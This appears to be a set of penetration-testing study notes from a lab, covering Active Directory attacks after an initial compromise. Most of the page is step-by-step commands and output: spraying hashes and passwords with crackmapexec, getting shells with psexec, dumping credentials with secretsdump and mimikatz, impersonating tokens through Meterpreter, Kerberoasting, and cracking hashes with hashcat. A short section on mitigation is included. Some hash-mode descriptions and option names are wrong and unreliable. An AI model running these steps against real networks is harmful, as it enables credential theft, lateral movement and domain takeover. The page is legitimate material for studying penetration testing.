---
description: We have access, now what?
---

# Attacking AD: Post-Compromise Attacks

## Introduction

* <mark style="color:yellow;">All attacks within this section involve having some type of credential first</mark>
* <mark style="color:yellow;">In other words, we need access for these attacks to be effective</mark>

## Pass the Hash/Password

* We need to grab our recently obtained hash/password and throw it around the network and see if anything sticks
* We can do that easily with <mark style="color:yellow;">crackmapexec</mark>

### Pass the Password

* Let's pass what we just cracked

```
crackmapexec 10.10.10.0/24 -u user -d htb -p Password1
```

### Pass the Hash

* We can do that by running metasploit's psexec, crackmapexec, or impacket's psexec

<mark style="color:yellow;">Metasploit: windows/smb/psexec</mark>

Pass the Hash:

```
crackmapexec 10.10.10.0/24 -u user -H <hash_here> --local
```

## Pass the Password Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u user -d htb.local -p Password1
```

* Did you get a pwn3d?&#x20;
* Time to psexec!

Psexec:

```
impacket-psexec domain/user:Password1@<pwn3d_IP>
```

## Dumping Hashes w/ secretsdump

Dumping hashes w/ known valid creds:

```
impacket-secretsdump domain/user:Password1@<pwn3d_IP>
```

* If you have more than 1 pwn3d IP, re run the tool with the other IP(s)!
* Focus on the local SAM hashes

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Grab the hashes and place them into a hashes.txt file to crack them and pass them around the network!!!

## Cracking NTLM Hashes w/ Hashcat

<mark style="color:yellow;">Note: You can pass around NTLMv1 hashes. You CAN'T pass around NTLMv2 hashes.</mark>

<mark style="color:yellow;">NTLMv1 Hashes: 1000</mark>

<mark style="color:yellow;">NTLMv2 Hashes: 5600</mark>

Step 1: Copy the hashes and place them into the Hashcat folder

Step 2: Attempt to crack the hashes

```
hashcat64.exe -m 1000 hashes.txt rockyou.txt -O
```

Blank Passwords:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* If you see something like this, odds are this account is disabled and you cannot do anything with it
* Still worth a shot!

## Pass the Hash Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
```

Get a pwn3d?

Time to get a shell:

```
impacket-psexec "Frank Castle":@192.168.57.141 -hashes LM:NT
```

## Token Impersonation

What are tokens?

* Tokens are <mark style="color:yellow;">temporary keys that allow you access to a system/network</mark> without having to provide credentials each time that you access a file.&#x20;
* This is comparable to <mark style="color:yellow;">cookies</mark> for computers

There are <mark style="color:yellow;">two types</mark> of tokens:

* <mark style="color:yellow;">Delegate</mark> - Created for logging into a machine or using RDP
* <mark style="color:yellow;">Impersonate</mark> - "non-interactive"; such as attaching a network drive or a domain logon script

### Meterpreter Shell

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > load incognito
Loading extensino incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
MARVEL\fcastle
```

* Try to look for a user that has a delegation token available that you have access to

The next thing we are going to do is try to impersonate that user:

```
meterpreter > impersonate_token marvel\\fcastle
Delegation tokens available
Successfully impersonated user MARVEL\fcastle

meterpreter > shell
C:\Windows\system32>whoami
marvel\fcastle
```

* If the user is a Domain Admin and that token is available, we can impersonate it and become them!
* We will use <mark style="color:yellow;">mimikatz</mark> here!

List Tokens:

```
meterpreter > list_tokens -u
Delegation tokens available
MARVEL\Administrator
MARVEL\fcastle
```

Impersonate Token:

```
meterpreter> impersonate_token MARVEL\\administrator
Delegation tokens available
Successfully impersonated user MARVEL\administrator

meterpreter> shell

C:\Windows\system32>whoami
marvel\administrator
```

* We are now administrator!

Now, we can Dump hashes as Domain Admin:

```
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local

mimikatz (powershell) # privilege::debug
privilege '20' OK

mimikatz (powershell) # LSADump::LSA /patch
```

* <mark style="color:yellow;">Upon success, this will dump all of the hashes within the domain</mark>
* <mark style="color:yellow;">This of course includes the Kerberos Ticket Granting Ticket Account (krbtgt)</mark>

## Incognito Token Impersonation

<mark style="color:yellow;">Remember, delegate tokens exist upon login and boot. If a user logs in, you can impersonate them until the computer reboots. Then, you will have to wait for them to log back in if so!</mark>

Servers are RARELY restarted.&#x20;

Think of the servers that you get access to, <mark style="color:yellow;">there very well could be a Domain Admin logged in</mark> to that computer! <mark style="color:yellow;">That token is essentially SITTING there</mark> until the computer reboots. This is one way to <mark style="color:yellow;">move laterally</mark> to machine to machine.&#x20;

* <mark style="color:red;">Metasploit</mark> will be utilized

```
msfconsole 

use exploit/windows/smb/psexec

set rhosts tun0

set dmbdomain <domain_here>

set smbpass <smb_pass_here>

set smbuser <user_here>

show targets

set target 2

set payload windows/x64/meterpreter/reverse_tcp

run

meterpreter >
```

* Okay, we have a meterpreter shell, now what?
* Time to configure PowerShell and Incognito

```
meterpreter > hashdump

meterpreter > getuid

meterpreter > sysinfo

meterpreter > load

meterpreter > shell

C:\Windows\system32>powershell -ep bypass

PS C:\Windows\system32> ^C #press ctrl+C
Terminate channel 1? [y/n] y

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > help
```

Now that we are at this point and we have a token we can impersonate, we can do things such as:

* Adding a user to a global group
* Adding a user to a local group
* Adding a user with all tokens
* Impersonating a token
* Listing tokens
* Snarfing hashes

### Impersonating Token

* We will be utilizing the <mark style="color:yellow;">impersonate\_token Incognito command</mark>

```
meterpreter > list_tokens -u

Delegate Tokens Available
MARVEL\Administrator

meterpreter > impersonate_token marvel\\administrator
Delegation token available
Successfully impersonated user MARVEL\Administrator

meterpreter > shell

C:\Windows\system32>whoami

marvel\administrator
```

### Attempting hashdump but the system is denying access?

<mark style="color:yellow;">rev2self</mark>

```
C:\Windows\system32> ^C
Terminate channel 2? [y/n] y

meterpreter > hashdump
Operation failed: Access is denied.

meterpreter > meterpreter > rev2self

meterpreter > hashdump

===dump will appear here===
```

### Did a new user just log in?

Say theoretically we are another user but fcastle logs in a few minutes ago. We can capture this behavior by listing the tokens on the machine via <mark style="color:yellow;">list\_tokens.</mark>

Once we have captured this user, we can then use <mark style="color:yellow;">impersonate\_token</mark> to impersonate them!

```
meterpreter > list_tokens -u

Delegation Tokens Available
MARVEL\Administrator
MARVEL\fcastle

meterpreter > impersonate_token marvel\\fcastle
Delegation token available
Successfully impersonated user MARVEL\fcastle
```

## Token Impersonation Mitigation

Strategies include:

* Limiting user/group token creation permissions
* Account tiering
* Local admin restriction

### Limiting user/group token creation permissions

Example:

Domain administrators should ONLY be logging into Domain Controllers. This is principal of least privilege (PoLP).

<mark style="color:yellow;">If for some reason that domain administrator logs into a user computer or a server and that user's computer gets compromised, that token can be impersonated!</mark>

This grants us an unbelievably easy win.

### Account Tiering

Always enforce local admin restrictions!

If users are NOT local admins on their computers, we cannot get a shell on that machine with their account. This entirely prevents us from getting onto the computer and utilizing this kind of attack.&#x20;

Example:

Bob has 2 accounts. Bob and Bob Admin.

Bob is for everyday use and only for that.

Bob Admin is used to access the Domain Controller and for that only.

## Kerberoasting

This is an attack against the Kerberos Authentication protocol.

<mark style="color:yellow;">This should always be attempted as soon as you get creds.</mark>

### How it works:

Step 1: This is when you have a valid user (username and password) account which will grant us a Ticket Granting Ticket (TGT).&#x20;

Step 2: With that TGT, you can request a service ticket for a service.

Step 3: That service ticket is going to be encrypted with the server's account hash.

Step 4: Capture the hash from the service ticket and crack the hash!

### Exploitation

<mark style="color:yellow;">Impacket-GetUserSPNs</mark>

* Remember, a valid username and password must be in your possession for this to work

Step 1: Get <mark style="color:yellow;">SPNs</mark> and <mark style="color:yellow;">dump hash</mark>

Example Syntax:

```
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.1 -request
```

Step 2: Copy/paste hash and place into a text file called kerberoast\_hash.txt

Step 3: Crack the hash with Hashcat

```
hashcat -m 13100 kerberoast_hash.txt rockyou.txt
```
